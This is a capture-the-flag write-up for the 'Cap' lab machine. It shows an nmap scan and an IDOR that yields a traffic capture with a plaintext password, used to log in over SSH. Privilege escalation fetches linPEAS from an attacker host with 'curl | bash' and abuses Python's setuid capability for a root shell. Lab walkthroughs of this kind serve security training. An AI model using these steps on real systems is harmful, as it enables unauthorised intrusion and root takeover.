---
type: Ctf
title: Cap
tags: []
---

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image.png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/193804f3-2a5e-4aa6-88ba-b390ec446da3)

## NMAP SCAN

```bash
nmap  -sC -sV -vv -p- -oA cap 10.10.10.245
```

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-06 00:46 +0000
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:46, 0.00s elapsed
Initiating Ping Scan at 00:46
Scanning 10.10.10.245 [4 ports]
Completed Ping Scan at 00:46, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:46
Scanning cap (10.10.10.245) [65535 ports]
Discovered open port 22/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Completed SYN Stealth Scan at 00:46, 17.39s elapsed (65535 total ports)
Initiating Service scan at 00:46
Scanning 3 services on cap (10.10.10.245)
Completed Service scan at 00:46, 6.10s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.245.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:46
Completed NSE at 00:47, 3.48s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.69s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Nmap scan report for cap (10.10.10.245)
Host is up, received echo-reply ttl 63 (0.043s latency).
Scanned at 2026-01-06 00:46:34 GMT for 28s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack ttl 63 Gunicorn
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:47
Completed NSE at 00:47, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds
           Raw packets sent: 65749 (2.893MB) | Rcvd: 65536 (2.621MB)
```

## Port 80



![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(1).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/6bac10aa-31e6-4e3e-a859-b1c3238bce15)

### Security Snapshot (5 Second PCAP + Analysis)

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(2).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/839c64b3-705b-43b6-8862-8266619baba0)

#### IDOR

```text
http://cap/data/0
```

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(3).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/95fefcff-c5d9-4fc7-bd55-aea943d4b950)

Download file 0.pcap

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(4).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/a720265a-60fb-4949-b68b-96e0f1810753)


## Wireshark

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(5).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/7abfb256-6369-4e54-a48a-cda4205a29ec)

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(6).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/3308d0bc-bfda-4040-96fb-13d5244d8bb7)

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(7).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/e8fd44dd-5de8-4e1f-92da-bb8bddcdcb7f)

Password: `Buck3tH4TF0RM3`



```bash
ssh nathan@10.10.10.245
```

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(8).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/1739cbe7-0829-4b6f-80a9-3b437f39e8cd)

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(9).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/578da34b-b554-48e2-bc8f-13490857a06a)

First flag: `010d60c4f5812177e140f01a4388cf4a`



## Privilege Escalation

[https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

```bash
wget https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
```

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(10).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/6ca759d9-d385-4f92-ac3c-17233ec47320)

Send the file `linpeas.sh` to thetarget machine
​

```bash
python3 -m http.server
```

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(11).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/340fa665-aa17-4bbb-92f3-49ef897fbca7)

```bash
wget 10.10.15.237:8000/linpeas.sh
```



![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(12).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/b2c94363-705b-4497-ba14-ab6fdf2d60c1)

```bash
curl 10.10.15.237:8000/linpeas.sh | bash
```

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(13).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/7448f119-c890-4445-99b5-f43e95e681a0)

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(14).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/6d416974-4e14-4ab1-b172-79fd3e7db0e0)

[https://gtfobins.github.io/gtfobins/python/#capabilities](https://gtfobins.github.io/gtfobins/python/#capabilities)

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(15).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/1c4bbb01-e37e-455d-9d36-922240713f0c)

```bash
Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
```

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(16).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/675b5fdf-ef28-465c-aa91-9da6c80e1253)

![image](./https:/app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/Media/image%20(17).png)
[image](https://app.capacities.io/b24aeb69-c633-44d6-bf8d-dc98478b9952/d9450898-7fc4-47e0-8654-9b43f8379c4d)

Second flag: `55f2ccfd78e10625d85cbbd696f7e64b`

